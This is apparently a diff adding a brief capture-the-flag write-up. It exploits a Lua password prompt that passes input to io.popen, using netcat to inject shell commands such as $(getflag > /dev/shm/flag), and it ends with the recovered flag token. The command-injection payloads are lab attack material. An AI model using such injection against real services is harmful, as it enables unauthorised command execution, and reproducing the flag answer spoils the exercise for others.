@@ -1,0 +1,17 @@
+We find a lua file that asks the user for a password
+After checking for lua exploits, we find one in the function io.popen
+We can inject code through the password prompt in this function to be executed
+First we have to open a connection to the server
+
+$nc localhost 5151
+Password: $(pwd > /dev/shm/output)
+Erf nope..
+$cat /dev/shm/output
+/
+It works, we try now with getflag
+
+$nc localhost 5151
+Password: $(getflag > /dev/shm/flag)
+Erf nope..
+$ cat /dev/shm/flag
+Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
